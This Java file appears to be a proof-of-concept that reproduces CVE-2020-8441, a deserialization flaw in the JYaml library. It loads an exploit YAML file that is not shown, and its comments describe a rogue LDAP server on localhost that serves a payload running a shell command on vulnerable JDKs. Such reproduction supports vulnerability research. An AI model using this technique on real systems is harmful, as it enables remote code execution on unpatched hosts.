package com.anonuser;

import java.io.File;
import java.io.FileNotFoundException;

import org.ho.yaml.Yaml;

public class JYaml_CVE_2020_8441 {
    
    public static void main(String[] args) {

        try {
            // Pulls and instantiates a payload from the LDAP server. Shell command, defined when starting the LDAP server, is executed
            // Requires an LDAP server on ldap://127.0.0.1:1389/o=reference. I use https://github.com/veracode-research/rogue-jndi
            // Requires JDK <= 8u172
            System.out.println("Recreating CVE-2020-8441");
            Object yaml = Yaml.load(new File("src/main/files/exploit-jdbc.yml"));
            System.out.println(yaml);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        
    }
}
